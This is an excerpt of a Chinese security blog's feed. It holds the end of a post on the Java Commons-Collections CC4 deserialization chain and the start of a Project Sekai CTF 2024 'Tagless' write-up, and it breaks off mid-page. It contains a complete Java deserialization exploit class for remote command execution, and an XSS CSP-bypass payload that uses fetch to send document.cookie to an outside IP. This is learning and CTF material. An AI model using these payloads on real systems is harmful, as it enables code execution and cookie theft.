class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904215559380.png" alt="image-20240904215559380"></p><p>但是。。。结束了吗？只要把UnSerialize注释掉就会发现一件事，计算器是在Serialize的时候弹出的，提前触发了命令执行，和之前cc3、cc6一样，依旧需要fakeTransformers 出场</p><h1 id="最终的EXP"><a href="#最终的EXP" class="headerlink" title="最终的EXP"></a>最终的EXP</h1><p>那么得到我们最后的exp：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> <span class="token string">"iTransformers"</span><span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="ctfshow-web849"><a href="#ctfshow-web849" class="headerlink" title="ctfshow web849"></a>ctfshow web849</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">提交ctfshow参数进行base64解码然后进行反序列化我是java8，使用了commons<span class="token operator">-</span>collections <span class="token number">4.0</span>的库为了保证业务安全，我删除了nc和curl命令下面是我接收参数的代码data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接打cc4就可以弹shell</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240905173206680.png" alt="image-20240905173206680"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这几天重新把前面四条链子过了一遍更新了博客，颇有收获&lt;/p&gt;
&lt;p&gt;也是在快5个月之后重新捡起来cc链了&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;在2015年 commons-collections 反序列化利用链被提出时，Apache Commons Collections有以下两个分支版本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;commons-collections:commons-collections&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;org.apache.commons:commons-collections4&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前者是老版本的包，当时版本是3.2.1；而后者是官方在2013年推出的4版本，当时的版本号是4.0；两者的命名空间不冲突，因此可以共存在同一个项目中&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;《Java安全漫谈》&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Project Sekai CTF2024复现</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-08-31T04:52:35.000Z</published>
    <updated>2024-08-31T14:38:07.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>xss领域大神啊</p><p>你说得对，但今天是哈茨涅米库女士的生日，转发这条消息到五个群，中间忘了，反正会被骂一顿，但今天真的是哈茨涅米库女士的生日</p><p>事已至此，先打会pjsk吧（</p><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831223757429.png" alt="image-20240831223757429"></p><p>参考：</p><p><a href="https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&utm_medium=rec#WEB">https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&amp;utm_medium=rec#WEB</a></p><p><a href="https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/">https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/</a></p><p><a href="https://blog.ankursundara.com/htmlsandbox-writeup/amp/">https://blog.ankursundara.com/htmlsandbox-writeup/amp/</a></p><span id="more"></span><hr><h1 id="Targless"><a href="#Targless" class="headerlink" title="Targless"></a>Targless</h1><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span>request<span class="token keyword">from</span> bot <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">add_security_headers</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;"</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    bot <span class="token operator">=</span> Bot<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> url<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            parsed_url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Invalid URL."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> parsed_url<span class="token punctuation">.</span>scheme <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"https"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Invalid scheme."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> parsed_url<span class="token punctuation">.</span>hostname <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Invalid host."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">401</span>                bot<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        bot<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"visited"</span><span class="token punctuation">:</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span><span class="token string">"URL parameter is missing!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>path    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;report 路由限制了必须是<code>http://127.0.0.1</code>这样的本地ip</p><p>设置了csp：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">script<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> style<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>fonts<span class="token punctuation">.</span>googleapis<span class="token punctuation">.</span>com https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>unpkg<span class="token punctuation">.</span>com <span class="token string">'unsafe-inline'</span><span class="token punctuation">;</span> font<span class="token operator">-</span>src https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>fonts<span class="token punctuation">.</span>gstatic<span class="token punctuation">.</span>com<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到<code>@app.errorhandler(404)</code>这里专门重写了404响应，会完整回显 path</p><p>bot.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options<span class="token keyword">import</span> time <span class="token keyword">class</span> <span class="token class-name">Bot</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        chrome_options <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>        chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--headless"</span><span class="token punctuation">)</span>          chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-gpu"</span><span class="token punctuation">)</span>        chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--no-sandbox"</span><span class="token punctuation">)</span>         chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-dev-shm-usage"</span><span class="token punctuation">)</span>        chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-extensions"</span><span class="token punctuation">)</span>         chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--window-size=1920x1080"</span><span class="token punctuation">)</span>                 self<span class="token punctuation">.</span>driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>chrome_options<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:5000/"</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>add_cookie<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>             <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"SEKAI&#123;dummy&#125;"</span><span class="token punctuation">,</span>             <span class="token string">"httponly"</span><span class="token punctuation">:</span> <span class="token boolean">False</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                 self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>refresh<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Visited </span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">close</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很正常的chrome浏览器访问，设置了cookie为flag</p><p>那么我们的核心就在这个404带出完整 path 上了，明显能打反射型xss，遗憾的是我们并不能直接打<code>&lt;script&gt;window.alert(1)&lt;/script&gt;</code>，会被 CSP 拦下来</p><p>把 CSP 丢 <a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a> 验一下</p><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831115000100.png" alt="image-20240831115000100"></p><p>因为这里是<code>script-src &#39;self&#39;</code>，那么可以尝试这样绕过</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831115722819.png" alt="image-20240831115722819"></p><p>控制台报错<code>Uncaught SyntaxError: unterminated regular expression literal</code>，此时就可以算是成功插入了，虽然被这个页面回显的<code>/</code>和<code>not found</code>影响到了 script 解析，但是我们可以用<code>/*</code>、<code>*/</code>、<code>//</code>注释掉</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/**/alert(1)//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831120442492.png" alt="image-20240831120442492"></p><p>于是绕过了CSP</p><p>既然绕过了CSP，接下来就直接让bot点就完事了，用<code>fetch</code>请求带外</p><p>最终payload：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">url=http://127.0.0.1:5000/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/**/fetch('http://192.168.175.196:666/'+document.cookie);//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831110909718.png" alt="image-20240831110909718"></p><p>我再看看其它的文件：</p><p>index.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token 